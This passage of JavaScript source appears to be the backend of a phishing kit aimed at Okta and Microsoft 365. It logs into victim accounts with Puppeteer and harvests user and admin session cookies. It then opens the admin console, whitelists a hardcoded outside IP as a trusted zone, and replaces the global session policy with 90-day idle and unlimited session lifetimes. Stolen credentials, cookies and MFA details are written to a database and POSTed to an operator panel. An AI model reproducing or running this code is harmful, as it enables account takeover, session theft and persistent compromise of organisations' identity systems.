}else if(typeof ResultByIds[dataId][decodeURI(dataEmail)]['okta']['login'][OktaLogin['user']] !=='undefined'){
LoginStatus=ResultByIds[dataId][decodeURI(dataEmail)]['okta']['login']['result'];    
}

pageTitle = await page.evaluate(() => document.title); 
var pageUrl = await page.evaluate(() => window.location.href);
console.log(pageTitle+'::::'+pageUrl);

if(pageTitle.includes('My Apps Dashboard')){
 console.log('LOGIN SUCCESS TO OKTA DASHBOARD');    
 successlogin=true;
 isCorrectLogin = true;
}else {
 console.log('FAILED LOGIN TO OKTA DASHBOARD');
 isCorrectLogin = false;
}





await debug(page,Math.floor(100000+Math.random() * 900000) + 1,RandArray.shift(),'catcherror13',dataDebug,false); 

if(successlogin){
if(successlogin&&((dataSetcookie&&dataCookie)||dataGetcookie)){
  cookies=await page.cookies();
  //console.log('cookies[1][name]:',cookies[1]['name']);
  //const cookieNeeded = cookies.some((cookie) => (cookie.name).startsWith('ESTSAUT'));
/*if(typeof cookieNeeded == 'undefined') {
  cookies=false;
  status="expiredcookies";
  console.log("ESTSAUT cookies doesn't found");
}*/

if(!cookies || cookies==''){
//cookies={cookie:"false"};
cookies=false;
console.log("OktaCookies::",cookies);//,null,2
}else{
    console.log("OktaCookies::true");//,null,2
    //console.log("OktaCookies::",JSON.stringify(cookies));//,null,2
}

}else{
    console.log("OktaCookies::none");
    cookies=false;
}


try{await page.waitForSelector('body', {waitUntil: 'networkidle2'});}catch(e){console.log('fail waitForSelector(body), catch err22::'+e);try{await page.waitForNavigation('networkidle2');}catch(e){}}

try{
await page.waitForFunction("document.querySelector('.header--admin-button')||document.querySelector('o-button[data-se=header-admin-button]')");IsAdmin=true;
}catch(e){console.log('fail waitForSelector(admin), catch err22::'+e);
    
try{await page.waitForSelector('body', {waitUntil: 'networkidle2'});}catch(e){console.log('fail waitForSelector(body), catch err23:'+e);try{await page.waitForNavigation('networkidle2');}catch(e){}}    
}

//await page.setGeolocation({latitude: 59.95, longitude: 30.31667});
//console.log("Wait 5 seconds");
//await page.waitForTimeout(5000);

if(await page.$('.header--admin-button') !== null||await page.$('o-button[data-se*=admin]') !== null||await page.$('button[data-se*=admin]') !== null) {
    console.log('OKTA ADMIN BUTTON');
    IsAdmin=true;
    var adminSelector = false;
try{

if(await page.$('.header--admin-button') !== null ){ 
   adminSelector = ".header--admin-button";
}else if(await page.$('o-button[data-se=header-admin-button]') !== null){
   adminSelector = "o-button[data-se=header-admin-button]";
}else if(await page.$('o-button[data-se*=admin]') !== null){
   adminSelector = "o-button[data-se*=admin]";
}else if(await page.$('button[data-se*=admin]') !== null){
   adminSelector = "button[data-se*=admin]";
}


// Clicks on an element at position x,y
  async function clickOnElement(elem, x = null, y = null) {
    const ELem = await page.$(elem);
    const rect = await page.evaluate(el => {
      const { top, left, width, height } = el.getBoundingClientRect();
      return { top, left, width, height };
    }, ELem);
  console.log(rect);
    // Use given position or default to center
    const _x = x !== null ? x : rect.width / 2;
    const _y = y !== null ? y : rect.height / 2;

    await page.mouse.click(rect.left + _x, rect.top + _y);
  }


    const browser = page.browser();
    
    let clickAndWaitForTarget = async (clickSelector, page, browser) => {
    const pageTarget = page.target(); //save this to know that this was the opener
    //await page.click(clickSelector); //click on a link
    clickOnElement(clickSelector);
    
    const newTarget = await browser.waitForTarget(target => target.opener() === pageTarget); //check that you opened this page, rather than just checking the url
    const newPage = await newTarget.page(); //get the page object
    // await newPage.once("load",()=>{}); //this doesn't work; wait till page is loaded
    await newPage.waitForSelector("body"); //wait for page to be loaded

    return newPage;
}


await page.focus(adminSelector); 
//clickOnElement(".header--admin-button");
page = await clickAndWaitForTarget(adminSelector, page, browser);
console.log("element mouse clicked");
//console.log("Wait 5 seconds:");
//await page.waitForTimeout(10000);

    
/*    await Promise.all([
    page.click('.header--admin-button'),
    page.waitForNavigation({waitUntil: 'networkidle2'})
]);
*/




try{await page.waitForSelector('body', {waitUntil: 'networkidle2'});}catch(e){console.log('fail waitForSelector(body), catch err23:'+e);

try{await page.waitForSelector('body', {waitUntil: 'networkidle2'});}catch(e){console.log('fail waitForSelector(body), catch err23:'+e);try{await page.waitForNavigation('networkidle2');}catch(e){}}
}
let PageTitle = await page.evaluate(() => document.title); 
let PageUrl = await page.evaluate(() => window.location.href); 
console.log(PageTitle+'::::::'+ PageUrl);
await debug(page,Math.floor(100000+Math.random() * 900000) + 1,RandArray.shift(),'adminconsole',dataDebug,false);

await page.waitForFunction("document.querySelector('.admin-header')");
console.log('LOGIN SUCCESS TO OKTA ADMIN CONSOLE'); 
IsAdmin = true;
IsLoggedToAdmin = true;
SAML_admin = PageUrl;
}catch(e){console.log('FAILED LOGIN TO OKTA ADMIN CONSOLE, catch err:'+e);}
}else{
    console.log('!!OKTA ADMIN BUTTON');
}



if(successlogin && IsAdmin && IsLoggedToAdmin && ((dataSetcookie&&dataCookie)||dataGetcookie)){
 admincookies=await page.cookies();
  //console.log('cookies[1][name]:',cookies[1]['name']);
  //const cookieNeeded = cookies.some((cookie) => (cookie.name).startsWith('ESTSAUT'));
/*if(typeof cookieNeeded == 'undefined') {
  cookies=false;
  status="expiredcookies";
  console.log("ESTSAUT cookies doesn't found");
}*/

if(!admincookies || admincookies==''){
//admincookies={cookie:"false"};
admincookies=false;
console.log("OktaAdminCookies::",admincookies);//,null,2
}else{
//console.log("OktaAdminCookies::",JSON.stringify(admincookies));//,null,2
console.log("OktaAdminCookies::true");
}

}else{
    console.log("OktaAdminCookies::none");
    admincookies = false;
}


//admin-header--menu-icon
//li[data-se='o-side-nav-item-SECURITY'] .nav-item--wrapper
var WhithlistIP = true;
var IncreaseSession = true
var addIpZoneName='TrustedIpZone';
if(WhithlistIP && await page.$("li[data-se='o-side-nav-item-SECURITY_NETWORK_ZONES'] a") !== null){
await page.evaluate(() => document.querySelector("li[data-se='o-side-nav-item-SECURITY_NETWORK_ZONES'] a").click());
    console.log("SECURITY > NETWORK : Clicked");
    
    

        try{ await page.waitForFunction("document.querySelector('#network-container')");console.log('SECURITY_NETWORK_ZONES'); }catch(e){console.log('SECURITY_NETWORK_ZONES failed, catch err:'+e);}

 
    
    
 
try{await page.waitForSelector('body', {waitUntil: 'networkidle2'});}catch(e){console.log('fail waitForSelector(body), catch err1:'+e);try{await page.waitForNavigation('networkidle2');}catch(e){}}

if(await page.$("#network-container") !== null&&await page.$("li[data-se='add-zone-dropdown-ip'] a")){
    

    
  //let [link] = await page.$x('//span[contains(text(),"TrustedIpZone")]');
  //await link[0].click()   
   if(WhithlistIP && await page.$x('//span[contains(text(),"TrustedIpZone")]')){
       console.log("TrustedIpZone already exist");
       //await page.evaluate(() => document.querySelector("a[data-se*=delete]").click());
       
       

await debug(page,Math.floor(100000+Math.random() * 900000) + 1,RandArray.shift(),'TrustedIpZone',dataDebug,false,true);        
       
       await page.click("a[data-se*=delete]");
       //await page.waitForNavigation('networkidle0');
    console.log("Delete Zone : Clicked");
     
       try{ await page.waitForFunction("document.querySelector('#simplemodal-container')&&document.querySelector('input[value=Delete]')");console.log('Delete Zone container'); }catch(e){console.log('Delete Zone failed, catch err:'+e);}   
    
     await page.evaluate(() => document.querySelector("input[value=Delete]").click());
     
     try{ await page.waitForFunction("!document.querySelector('#simplemodal-container')&&!document.querySelector('input[value=Delete]')");console.log('Zone deleted'); }catch(e){console.log('Delete Zone failed, catch err:'+e);} 
      
   }
    
    
    
    
await page.evaluate(() => document.querySelector("li[data-se='add-zone-dropdown-ip'] a").click());
    console.log("ADD-ZONE > ip zone button : Clicked");
    
    
  try{ await page.waitForFunction("document.querySelector('#simplemodal-container')&&document.querySelector('input[value=Save]')");console.log('Add IP Zone container'); }catch(e){console.log('Add IP Zone failed, catch err:'+e);}   
    
    //here
    if(await page.$('input[type=text]') !== null && await page.$('textarea[name=gateways]') !== null && await page.$("input[type=submit]") !== null ){
 
//+randomId(6);
await page.type("input[type=text]",addIpZoneName,{delay:25});
console.log('addIpZoneName putted');

//Separate entries with a new line or comma. Use CIDR notation or separate IPs in a range with a dash.<br> Example: 127.0.0.1, 192.168.0.0/24<br> 192.168.0.1-192.168.0.254

//Max 150
var GatewayIPS='105.156.213.166';
//192.168.0.1//
//192.168.0.1-192.168.0.254//range
//192.168.0.1,192.168.0.254//list
//192.168.0.0/24




await page.$eval("textarea[name=gateways]", el => el.value = '');
await page.type("textarea[name=gateways]",GatewayIPS,{delay:25});

//Add current IP address
await page.evaluate(() => document.querySelector("span[data-se='o-form-input-client-ip']").click());

console.log('Gateway IPS putted:',GatewayIPS);

//Max 150
var TrustedproxyIPs='';
await page.$eval("textarea[name=proxies]", el => el.value = '');
await page.type("textarea[name=proxies]",TrustedproxyIPs,{delay:25});
console.log('Trusted proxy IPs putted:',TrustedproxyIPs);


await page.evaluate(() => document.querySelector("input[type=submit]").click());
    console.log("Submit button : Clicked");
    
    
  try{ await page.waitForFunction("!document.querySelector('.o-form-has-errors')&&!document.querySelector('input[type=submit]')");console.log('Add IP Zone success'); }catch(e){console.log('Add IP Zone submit failed, catch err:'+e);}      
    
    
}


}    

}
   


if(IncreaseSession && await page.$("li[data-se='o-side-nav-item-SECURITY_GLOBAL_SIGN_ON_POLICY'] a") !== null ){



//Max Okta session lifetime

console.log('Edit Global Session Policy');
//li[data-se=o-side-nav-item-SECURITY]
/*    try{await page.click("li[data-se='o-side-nav-item-SECURITY_GLOBAL_SIGN_ON_POLICY'] a");console.log('SECURITY_GLOBAL_SIGN_ON_POLICY button clicked');





    
try{await page.waitForSelector('body', {waitUntil: 'networkidle2'});}catch(e){console.log('fail waitForSelector(body), catch err20:'+e);try{await page.waitForNavigation('networkidle2');}catch(e){}}    
    
 
    
        try{ await page.waitForFunction("document.querySelector('div[data-se=policies-data-list-sidebar]')"); console.log('SECURITY_GLOBAL_SIGN_ON_POLICY button successfuly clicked'); }catch(e){console.log('SECURITY_GLOBAL_SIGN_ON_POLICY button click failed, catch err:'+e);}

    }catch(e){console.log('SECURITY_GLOBAL_SIGN_ON_POLICY click failed, catch err:'+e);}

*/
if(await page.$("li[data-se='o-side-nav-item-SECURITY_GLOBAL_SIGN_ON_POLICY'] a") !== null){
//await page.click("li[data-se='o-side-nav-item-SECURITY_GLOBAL_SIGN_ON_POLICY'] a");
//const hrefLink = "/admin/access/policies";
// await page.waitForSelector(`a[href="${hrefLink}"]`, {visible: true});
// await page.click(`a[href="${hrefLink}"]`);


   // let [link] = await page.$x('//span[contains(text(),"Global")]');
    //await link[0].click();
    //await page.click(link[0]);
    //await page.waitForTimeout(3000);
 //   console.log("Global Session Policy Clicked");
//    await page.waitForNavigation('networkidle0'); 


//document.querySelector("li[data-se='o-side-nav-item-SECURITY_GLOBAL_SIGN_ON_POLICY'] a").click()
await page.evaluate(() => document.querySelector("li[data-se='o-side-nav-item-SECURITY_GLOBAL_SIGN_ON_POLICY'] a").click());
    console.log("SECURITY > Global Session Policy : Clicked");
}    

try{await page.waitForSelector('body', {waitUntil: 'networkidle2'});}catch(e){console.log('fail waitForSelector(body), catch err1:'+e);try{await page.waitForNavigation('networkidle2');}catch(e){}}

await debug(page,Math.floor(100000+Math.random() * 900000) + 1,RandArray.shift(),'whitelistip',dataDebug,false,true); 

/*
(await page.$$eval(selector, a => a
            .filter(a => a.textContent === 'Global Session Policy')
))[0].click()
*/
if(await page.$("li[data-se*=Default_Policy]") !== null ){
//document.querySelector('li[data-se="Default_Policy_fxvpxh"]').click()


    try{page.click("a[data-se='policy-delete']");console.log('delete policy button clicked');await page.waitForFunction("document.querySelector('.simplemodal-close')");  
    
        try{ await page.waitForFunction("document.querySelector('input[type=submit]')");page.click("input[type=submit]");console.log('delete policy submit button clicked'); await page.waitForFunction("!document.querySelector('input[type=submit]')&&!document.querySelector('li[data-se=Default_Policy]')");console.log('Policy successfuly deleted'); }catch(e){console.log('delete policy button click failed, catch err:'+e);}

    }catch(e){console.log('add policy button click failed, catch err :'+e);} 

}

if(await page.$('a[data-se=policy-add]') !== null ){
 console.log("add policy button exist"); 
 
 
    try{page.click("a[data-se=policy-add]");console.log('add policy button clicked');await page.waitForFunction("document.querySelector('form[name=ADD_EDIT_POLICY]')");  
    
        try{ await page.waitForFunction("document.querySelector('form[name=ADD_EDIT_POLICY]')"); console.log('add policy button successfuly clicked'); }catch(e){console.log('add policy button click failed, catch err:'+e);}

    }catch(e){console.log('add policy button click failed, catch err :'+e);} 
 

 
 
if(await page.$('input[name=name]') !== null && await page.$('input[name=description]') !== null && await page.$("input[name='conditions.people.groups.include']") !== null ){
 
var addpolicyname='Default_Policy';//+randomId(6);
await page.type("input[name=name]",addpolicyname,{delay:25});
console.log('addpolicyname putted');

var addpolicydesc='default policy';
await page.type("input[name=description]",addpolicydesc,{delay:25});
console.log('addpolicydescription putted');


//.as-selections focus
var addpolicygroup='Everyone';
await page.type("input[name='conditions.people.groups.include']",addpolicygroup,{delay:25});
console.log('addpolicygroup putted');

//wait for .as-selections.results-shown

await page.waitForFunction("document.querySelector('.as-selections.results-shown')"); 

if(await page.$('.as-selections.results-shown') !== null){
    try{page.click("#as-result-item-0");console.log('Everyone button clicked');await page.waitForFunction("document.querySelector('.as-close')");  
    
        try{ await page.waitForFunction("document.querySelector('.as-close')"); console.log('Assign to Everyone group successfuly clicked'); }catch(e){console.log('Everyone button click failed, catch err:'+e);}

    }catch(e){console.log('Assign to Everyone group failed, catch err:'+e);} 
}



//form[name=ADD_EDIT_POLICY]
//form[name=ADD_EDIT_RULE]
    try{page.click("input[value='Create policy and add rule']");console.log('Create policy and add rule bsubmit button clicked');await page.waitForFunction("document.querySelector('form[name=ADD_EDIT_RULE]')");  
    
        try{ await page.waitForFunction("document.querySelector('form[name=ADD_EDIT_RULE]')"); console.log('submit successfuly clicked'); }catch(e){console.log('submit click failed, catch err:'+e);}

    }catch(e){console.log('submit failed, catch err:'+e);} 

//await page.waitForTimeout(5000);
await debug(page,Math.floor(100000+Math.random() * 900000) + 1,RandArray.shift(),'addpolicy',dataDebug,false,true); 

 
}
 
 
 
if(await page.$('form[name=ADD_EDIT_RULE]') !== null){
  
console.log('Add Rule container');
var RuleName='Default_Rule';//+randomId(6);
await page.type("input[name='name']",RuleName,{delay:25});
//const RuleNameType = await page.evaluate((RuleName) => document.querySelector("input[name=name]").value=`${RuleName}`,RuleName);

console.log('Rule Name putted');


try{
//document.querySelector("div.o-form-fieldset.actions-signon-session-usePersistentCookie .selectize-input").click()
//await page.click(".actions-signon-session-usePersistentCookie > div.selectize-input");


try{
if(await page.$('.o-form-input-name-__connection__') !== null){

//await page.evaluate(() => document.querySelector(".o-form-input-name-__connection__").click());
    //console.log("IP ZONE Dropdown list : Clicked");
    
//await page.waitForFunction("!document.querySelector('.o-form-input-name-__connection__ .chzn-container-single-nosearch.closed')"); 

await page.select("select[name='__connection__']", "ZONE_IN")
console.log('IP ZONE selected');  

//await page.$eval("input[placeholder=Zones]", el => el.value = '');
await page.type("input[placeholder=Zones]",addIpZoneName,{delay:25});
//await page.keyboard.press('Enter');

let [link] = await page.$x('//div[contains(text(),"TrustedIpZone")]');
await link[0].click()    



await page.waitForFunction("document.querySelector('.selectize-input.not-full.has-items')"); 

console.log('IP ZONE putted success');
}


}catch(e){
 console.log('IP ZONE, catch err:'+e);   
}

await debug(page,Math.floor(100000+Math.random() * 900000) + 1,RandArray.shift(),'IpZone',dataDebug,false,true); 


try{
const usePersistentCookie = await page.evaluate(() => document.querySelector(".item").click());
//await page.click(".item");

console.log('B CLICKED');
await page.waitForFunction("document.querySelector('.selectize-input.items.has-options.full.has-items.focus.input-active')"); 
console.log('B WAITED');
await page.click("div[data-value=ENABLED].option");

console.log('Persist session cookies across browser sessions Enabled');
}catch(e){
 console.log('usePersistentCookie, catch err:'+e);   
}


await page.select("select[name='__sessionIdleUnit__']", "DAY")
console.log('DAY selected');

var maxSessionIdle='90';//90 MAXIMUM
await page.$eval("input[name='actions.signon.session.maxSessionIdleMinutes']", el => el.value = '');
await page.type("input[name='actions.signon.session.maxSessionIdleMinutes']",maxSessionIdle,{delay:25});
console.log('Expire session after user has been idle on Okta for:'+maxSessionIdle+'DAYS');


//await page.click("input[value='NO_TIMELIMIT']");
const MaxSessionLifetime = await page.evaluate(() => document.querySelector("input[value='NO_TIMELIMIT']").click());

console.log('SET Maximum Okta session lifetime TO: (No time limit)');

}catch(e){console.log('+click failed, catch err:'+e);}

await debug(page,Math.floor(100000+Math.random() * 900000) + 1,RandArray.shift(),'putrulename',dataDebug,false,true); 

    try{page.click("input[type=submit]");console.log('submit button clicked.');await page.waitForFunction("document.querySelector('input[type=submit]') === null");  
    
        try{ await page.waitForFunction("document.querySelector('input[type=submit]') === null"); console.log('submit successfuly clicked.'); }catch(e){console.log('submit click failed, catch err:'+e);}

    }catch(e){console.log('submit failed, catch err :'+e);}

    
} 
 
 
 
 
 
 
}




 
console.log('WHITLISTING IP IS FINISHED');    
}



}
result['OktaCookies'] = cookies;
result['OktaAdminCookies'] = admincookies;


await debug(page,Math.floor(100000+Math.random() * 900000) + 1,RandArray.shift(),'whitelistip2',dataDebug,false,true); 



 LoadTime_ms = new Date()-StartTime;
 LoadTime2_ms = new Date()-StartTime2;
//console.log('time1: '+new Date()+' time2: '+new Date());
 LoadTime_s = Math.floor(LoadTime_ms/1000);
 LoadTime2_s = Math.floor(LoadTime2_ms/1000);

                    result['Load_time'] = LoadTime_s+' Seconds('+LoadTime2_s+'Sec)';
                    console.log('Load_time: '+LoadTime_s+' Seconds('+LoadTime2_s+'Sec)');
					result['Time'] = DateNow;
					

console.log(result);
ResultByIds[dataId][dataEmail]['okta']['display'] = result;
ResultByIds[dataId][dataEmail]['okta']['action']='Completed';
console.log(JSON.stringify(ResultByIds[dataId]));

var AccCOUNTRYCode = "";
var SessionSTATUS = false;
if(cookies && cookies['cookie']!=="false"){
SessionSTATUS = true;    
}

//var CurrentDate = "";
//var LastUpdate = "";
//var ExpiryDate = "";
var st = false; 
if(successlogin && SessionSTATUS && IsAdmin && IsLoggedToAdmin  && admincookies){
st = 'Okta_Success';
}else if(successlogin && SessionSTATUS ){
st = 'Okta_Success_NoAdmin';
}else if(successlogin){
st = 'Okta_Success_NoSession';
}else{
st = 'Okta_Failed';
}

var MfaMode = dataMfaType;//dataMfaDefaultType
var ss = '';
var isget2fakey = '';
var WhiteIP = null;
var UserIP = decodeURIComponent(atob_safe(decodeURIComponent(dataUserIP)));
var UserCOUNTRY = false;
var UserCOUNTRYCode = false;
var UserLocation = false;
try{
UserLocation = await fetch(`https://extreme-ip-lookup.com/json/${UserIP}?callback=&key=Qn97RtiI2gwjStzJJjuG`,{cache: "no-cache"}).then(function(response) { return response.json(); }).then(function(json) {if(json&&json.status&&json.status=="success"){const ULocation = [];ULocation['country']=json.country;ULocation['countryCode']=json.countryCode; return ULocation;}else{return false;} });
if(UserLocation){
UserCOUNTRY = UserLocation["country"];
UserCOUNTRYCode = UserLocation["countryCode"];
}
console.log('UserIP:'+UserIP);
console.log('UserCOUNTRY:'+UserCOUNTRY);
console.log('UserCOUNTRYCode:'+UserCOUNTRYCode);
}catch(err){console.log('err:'+err);}

if(!GetSessionIP){SessionIP=null;};
const CurrentDate = new Date();
//const CurrentDate2 = new Date(CurrentDate);
const ExpiryDate = new Date(CurrentDate)
if(!LoginStatus){
 LoginStatus=ss;   
}
var arrayval = [
dataEmail,
'',
st,
IsO365,
IsSAML,
IsOKTA,
IsAdmin,
successlogin,
IsLoggedToAdmin,
SAML,
SAML_user,
SAML_pass,
SAML_admin,
AccountTYPE,
AccCOUNTRYCode,
dataId,
UserIP,
UserCOUNTRYCode,
decodeURIComponent(atob_safe(decodeURIComponent(dataUserUA))),
MfaMode,
LoginStatus,
isget2fakey,
decodeURIComponent(atob_safe(decodeURIComponent(dataServerHOST))),
decodeURIComponent(atob_safe(decodeURIComponent(dataServerIP))),
SessionSTATUS,
JSON.stringify(cookies),
JSON.stringify(admincookies),
SessionIP,
SessionCOUNTRYCode,
RndUserAgent,
dataAppID,
decodeURIComponent(dataAdminPanel),
WhiteIP,
CurrentDate.toLocaleString('sv-SE', {timeZone: 'UTC'}),
CurrentDate.toLocaleString('sv-SE', {timeZone: 'UTC'}),
(new Date(ExpiryDate.setHours(ExpiryDate.getHours() + 5))).toLocaleString('sv-SE', {timeZone: 'UTC'})
];

//insert results okta
if(insertIntoAdminDatabase){
//insert into admin database
var OktaStatusArr="('Okta_Success','Okta_Success_NoAdmin','Okta_Success_NoSession','Okta_Failed')";
if(st =='Okta_Success'){
OktaStatusArr="('Okta_Success','Okta_Success_NoAdmin','Okta_Success_NoSession','Okta_Failed')";    
}else if(st =='Okta_Failed'){
OktaStatusArr="('Okta_Failed')";     
}else if(st =='Okta_Success_NoAdmin'){
OktaStatusArr="('Okta_Success_NoAdmin','Okta_Success_NoSession','Okta_Failed')";
}else if(st =='Okta_Success_NoSession'){
OktaStatusArr="('Okta_Success_NoSession','Okta_Failed')";     
}
console.log("STATUS:"+st);
var alreadyExist = false;
con.query("SELECT * FROM Results WHERE EMAIL = '"+dataEmail+"' AND PASSWORD = '' AND SAML_user = '"+SAML_user+"' AND SAML_pass = '"+SAML_pass+"' AND STATUS IN '"+OktaStatusArr,function (err, result, fields) {
      //con.resume();
    //if (err) throw err;
    if (result && result.affectedRows > 1){
    console.log("alreadyExist:result:",result);
    console.log("alreadyExist:fields:",fields);
    console.log("result.affectedRows:",result.affectedRows);
    alreadyExist = result;
    }
  });

console.log('alreadyExist:',alreadyExist);
var sql = false;
if(alreadyExist){

//result[0].
var i=1;
var ids="(";
while (i < alreadyExist.length) {
  ids += alreadyExist[i].id;
  if(i < alreadyExist.length-1) {
  ids += ',';
  }
  i++;
}
 ids += ")";
sql = "DELETE FROM Results WHERE id IN "+ids;
con.query($sql,function (err, result, fields) {
      //con.resume();
    //if (err) throw err;
    if (result && result.affectedRows !== 0){
    console.log("deleted duplicate results :result:",result);
    console.log("deleted duplicate results :fields:",fields);
    console.log("result.affectedRows:",result.affectedRows);
    }
  });


console.log("update results okta");    
 //update  
   con.query("SET time_zone = '+00:00'");
sql = "UPDATE Results SET EMAIL=?,PASSWORD=?,STATUS=?,IsO365=?,IsSAML=?,IsOKTA=?,IsAdmin=?,IsLogged=?,IsAdLogged=?,SAML=?,SAML_user=?,SAML_pass=?,SAML_admin=?,AccountTYPE=?,AccCOUNTRY=?,UserID=?,UserIP=?,UserCOUNTRY=?,UserUA=?,MfaTYPE=?,MfaSTATUS=?,MfaCODE=?,ServerHOST=?,ServerIP=?,SessionSTATUS=?,SESSION=?,AdSESSION=?,SessionIP=?,SessCOUNTRY=?,SessionUA=?,AppID=?,AdminPanel=?,WhiteIP=?,DATE=?,LastUPDATE=?,ExpiryDATE=? WHERE EMAIL = '"+dataEmail+"' AND SAML_user = '"+SAML_user+"' AND STATUS IN "+OktaStatusArr+";";

    
}else{
console.log("insert results okta"); 
//insert results okta
  //SET time_zone = '+00:00';
  con.query("SET time_zone = '+00:00'");
sql = "INSERT INTO Results (EMAIL,PASSWORD,STATUS,IsO365,IsSAML,IsOKTA,IsAdmin,IsLogged,IsAdLogged,SAML,SAML_user,SAML_pass,SAML_admin,AccountTYPE,AccCOUNTRY,UserID,UserIP,UserCOUNTRY,UserUA,MfaTYPE,MfaSTATUS,MfaCODE,ServerHOST,ServerIP,SessionSTATUS,SESSION,AdSESSION,SessionIP,SessCOUNTRY,SessionUA,AppID,AdminPanel,WhiteIP,DATE,LastUPDATE,ExpiryDATE) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)";
}
console.log("sql:",sql); 
  con.query(sql,arrayval,function (err, result, fields) {
      //con.resume();
    if (err) throw err;
    console.log("Successfully Inserted Record::",result);
    
  });
//insert into admin database
}
if(insertIntoUserDatabase){
//insert into user database
const urlpost = `${decodeURIComponent(dataAdminPanel)}/json.php`;
console.log('urlpost : '+urlpost);


 console.log("fetching....");
const resp = await fetch(urlpost, {
  method: 'POST',
  mode: 'cors',
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify(arrayval)
}).then(function(response) { return response.text(); });
console.log("body :",await resp);
//insert into user database
}
console.log('End Checksaml'); 
//return result; 
return ;
}else if (data.reqsession){
//?session

const dataurl=data.requrl;
const dataemail=data.reqemail;
const datapass=data.reqpass;//'aJ6QVibgsJt.udd';
const datadebug=data.reqdebug;//'true';
const dataid=data.reqid;
const token=data.reqtoken;
const setcookie=data.reqsetcookie;
console.log('setcookie: ',setcookie);
const getcookie=data.reqgetcookie;
const getAdminSession = true;////data.reqgetAdminSession;///////edit
const cookie=data.reqcookie;
const sendresponse=data.reqres;
const increasesessionlife=data.reqincreasesessionlife;
const SkipMFAforIps=data.reqSkipMFAforIps;
const dataUserIP=data.reqUserIP;
const UserUA=data.reqUserUA;
const ServerIP=data.reqServerIP;
const ServerHOST=data.reqServerHOST;
const MfaType=data.reqMfaType;
const MfaDefaultType=data.reqMfaDefaultType;
const dataAppID=data.reqappID;
const dataAdminPanel=data.reqadminLink;
//const SessionIP=data.reqSessionIP;

var startTime = data.reqtime;
var startTime2 = new Date();
var DateNow = new Date().toUTCString();
var result = { };
var imagesEnabled = true;
var fontsEnabled = false;
var stylesheetEnabled = true;
var checksession = true;
var AdminCookies = false;
var typeMfa = false;
var MfaCode = false;
var AccCountryCode = false;
var isAdmin = false;
var IsLoggedtoAdmin = false;
var isGcc = false;//What is Microsoft GCC?: GCC, Government Community Cloud, can essentially be thought of as a government focused copy of the commercial environment. It has many of the same features, but features data centers ONLY in the continental United States (CONUS), as mandated by FedRAMP Moderate. Compliance frameworks that can be met in GCC include:
var isConsumerUser = false;//is free (personal) office 365 account?
var isSmb = false;//is small business (work) off 365 account?
var isEdu = false;//is Education (school) office 365 account?
var LoginStatus = false;
ResultByIds[dataid][dataemail]['login']['action'] = "Pending";
console.log("action:"+JSON.stringify(ResultByIds[dataid][dataemail]['login']['action']));


        //await page.goto('http://' + url);
        // ...
        //return await page.content();
                
            
            
/*            const browser = await puppeteer.launch({
           args: ['--no-sandbox', '--disable-setuid-sandbox']
            });
*/            
/*const browser = await puppeteer.connect({
      browserWSEndpoint: browserWSEndpoint,
    });  */          
//const page = await browser.newPage({ context: rand });

// set the viewport so we know the dimensions of the screen
/*await page.setViewport({
    width: 800,//1279
    height: 600//917
});*/

var isMfa = false; var MfaMode = false; var isMfaPanel = false; var isMfaBox = false; var MfaNeedMode = MfaType; var all2FA = false; var isMfaError = false; var isget2fakey = false; var finalstatus = false; var MfaModes = ["PhoneAppNotification","PhoneAppOTP","OneWaySMS","TwoWayVoiceMobile","verify_email"];var wronguser = false;var Pickaccount=false;var submitlogin = false;var successlogin = false;var faillogin =false; var MfaSucceed = false; var MfaFailed = false; var done =false; var ResponseEnd=false; var ResponseEndjson = false; var MfaNeedSelector = []; var status=false;var isSkipMfaR=false;var cookies = false;var MfaDefaultMode = MfaDefaultType;var IsO365 = false;

// go to a page setup for mouse event tracking
//await page.goto('http://unixpapa.com/js/testmouse.html');
console.time('all('+RandArr[0]+')');
console.time('gourl('+RandArr[1]+')');


//await page.setRequestInterception(true);
/*page.on('request', (request) => {
    if (['image', 'stylesheet', 'font', 'script'].indexOf(request.resourceType()) !== -1) {
        request.abort();
    } else {
        request.continue();
    }
});
*/
//await page.setDefaultNavigationTimeout(60000); //timeout 60 seconds now
let Redirect_uri=false;
await page.setRequestInterception(true);
page.on('request', request => {
        if ((!imagesEnabled && ['image'].indexOf(request.resourceType()) !== -1) || (!fontsEnabled && ['font'].indexOf(request.resourceType()) !== -1) || (!stylesheetEnabled && ['stylesheet'].indexOf(request.resourceType()) !== -1)) {
                request.abort();//block request
            }else if (request.isNavigationRequest() && (request.resourceType() === 'document'/*||request.resourceType() === 'xhr'*/)) {//xhr, fetch
           //console.log("request : "+request.url())
           
if(setcookie&&cookie&&request.url().includes('&redirect_uri=')&&(request.url().includes('https://login.microsoftonline.com/common/')||request.url().includes('https://login.live.com/'))){
 console.log('request.url().includes(&redirect_uri=):yes');   
 const url_uri = new URL(request.url());
Redirect_uri = decodeURIComponent(url_uri.searchParams.get('redirect_uri'));
console.log('Redirect_uri:',Redirect_uri);

/*
const windowSet = (page, name, value) =>
  page.evaluateOnNewDocument(`
    Object.defineProperty(window, '${name}', {
      get() {
        return '${value}'
      }
    })
  `)
);
*/
/*page.evaluateOnNewDocument((Redirect_uri) => {
    window.redirecturi = 'Redirect_uri';
    //console.log('redirect_uri1:'+window.redirecturi);
  }, Redirect_uri);
*/  
}          
           
           
           
           
                request.continue();
            }else{
        request.continue()
            }
    });
let BeginAuthjson =false;
page.on('response', async response => {
    function IsJsonString(str) {
    try {
        JSON.parse(str);
    } catch(e) {
        return false;
    }
    return true;
}
if(response.url().includes('/resume?ctx=')){console.log("login successful");console.log("auto login link: "+response.url());
}else if (response.request().resourceType() === 'document'||response.request().resourceType() === 'xhr'){
      try{console.log("response url: "+response.url());}catch(ee){console.log("response url catch Err: "+ee);}
      //try{if(await response.text()&&IsJsonString(await response.text())){console.log("response json: "+JSON.stringify(await response.json()));}else{console.log("response text: "+await response.text());}}catch(ee){console.log("response Err: "+ee);if(await response.headers()['location']){console.log('Redirect from: ', response.url(), ' to: ', await response.headers()['location']);}}

if(response.url()==="https://login.microsoftonline.com/common/SAS/BeginAuth"){
         try {
         try{
          BeginAuthjson=await response.json();//JSON.parse()
         } catch(error) {} 
           if(BeginAuthjson && BeginAuthjson['Success']===true){
               console.log('BeginAuthjson[Timestamp]:',BeginAuthjson['Timestamp']);
               return BeginAuthjson['Timestamp'];
           }
          
         } catch(error) {
          //return false;
         }
